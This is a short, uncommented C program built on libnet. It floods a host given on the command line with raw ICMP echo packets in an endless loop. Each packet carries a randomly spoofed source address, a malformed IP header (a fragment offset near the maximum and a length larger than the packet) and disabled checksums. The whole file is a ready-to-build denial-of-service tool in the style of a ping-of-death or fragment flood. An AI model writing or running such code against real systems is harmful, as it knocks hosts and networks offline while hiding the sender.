#include <libnet.h>

int main(int argc, char **argv)
{
	libnet_t *l;
	char errbuf[LIBNET_ERRBUF_SIZE];
	uint32_t tip, sip;
	libnet_ptag_t icmp, ip;

	if (argc < 2)
		return 2;

	if (!(l = libnet_init(LIBNET_RAW4, NULL, errbuf)))
		return 1;

	libnet_seed_prand(l);
	sip = libnet_get_prand(LIBNET_PRu32);

	if ((tip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1)
		return 1;

	icmp = LIBNET_PTAG_INITIALIZER;
	ip = LIBNET_PTAG_INITIALIZER;

	while (1) {
		icmp = libnet_build_icmpv4_echo(ICMP_ECHO, 0, 0, 0, 0, NULL, 0, l, icmp);
		libnet_toggle_checksum(l, icmp, 0);
		ip = libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H + 40, 0, 0x455, 8190, 255, IPPROTO_ICMP, 0, sip, tip, NULL, 0, l, ip);
		libnet_write(l);
	}
}
